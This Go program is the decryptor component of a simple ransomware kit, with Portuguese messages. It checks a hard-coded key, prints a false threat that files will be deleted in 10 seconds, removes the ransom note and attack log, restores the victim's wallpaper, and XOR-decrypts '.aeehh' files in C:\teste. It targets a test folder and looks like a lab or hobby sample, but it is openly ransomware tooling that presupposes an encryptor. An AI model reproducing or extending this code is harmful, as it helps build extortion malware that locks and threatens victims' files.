package main

import (
	"fmt"
	"io/ioutil"
	"os"
	"path/filepath"
	"strings"
	"time"
	"unsafe"

	"golang.org/x/sys/windows"
)

const password = "123"

// ======================= FUNÇÕES PRINCIPAIS =======================

func xorEncrypt(data []byte) []byte {
	encrypted := make([]byte, len(data))
	for i := range data {
		encrypted[i] = data[i] ^ password[i%len(password)]
	}
	return encrypted
}

func restoreOriginalWallpaper() {
	targetDir := ""
	data, err := ioutil.ReadFile(filepath.Join(targetDir, "original_wallpaper.txt"))
	if err != nil {
		return
	}

	originalPath := string(data)
	user32 := windows.NewLazySystemDLL("user32.dll")
	systemParameters := user32.NewProc("SystemParametersInfoW")

	pathUTF16, _ := windows.UTF16PtrFromString(originalPath)
	systemParameters.Call(
		uintptr(0x0014), // SPI_SETDESKWALLPAPER
		0,
		uintptr(unsafe.Pointer(pathUTF16)),
		uintptr(0x01|0x02), // SPIF_UPDATEINIFILE | SPIF_SENDCHANGE
	)

	os.Remove(filepath.Join(targetDir, "original_wallpaper.txt"))
}

func main() {
	targetDir := `C:\teste`
	fmt.Print("\033[36m") // Cor ciano
	fmt.Println("[?] Insira a chave de descriptografia:")
	fmt.Print("\033[0m")

	var inputKey string
	fmt.Scanln(&inputKey)

	if inputKey != password {
		fmt.Print("\033[31m")
		fmt.Println(`  
        ⚠️⚠️⚠️ CHAVE INVÁLIDA! ⚠️⚠️⚠️  
        SEUS ARQUIVOS SERÃO DELETADOS EM 10 SEGUNDOS!  
        `)
		fmt.Print("\033[0m")
		time.Sleep(10 * time.Second)
		return
	}

	// Apagar arquivos de aviso
	os.Remove(filepath.Join(targetDir, "!!!WARNING!!!.txt"))
	os.Remove(filepath.Join(targetDir, "attack_log.txt"))

	// Restaurar wallpaper original
	restoreOriginalWallpaper()

	// Descriptografar arquivos
	filepath.Walk(targetDir, func(path string, info os.FileInfo, err error) error {
		if err != nil || info.IsDir() || !strings.HasSuffix(info.Name(), ".aeehh") {
			return nil
		}

		data, _ := ioutil.ReadFile(path)
		decryptedData := xorEncrypt(data)

		originalName := strings.TrimPrefix(strings.TrimSuffix(info.Name(), ".aeehh"), "[RANSOM]")
		ioutil.WriteFile(filepath.Join(filepath.Dir(path), originalName), decryptedData, 0644)
		os.Remove(path)

		return nil
	})

	fmt.Print("\033[32m")
	fmt.Println("[+] Arquivos restaurados com sucesso!")
	fmt.Print("\033[0m")
}
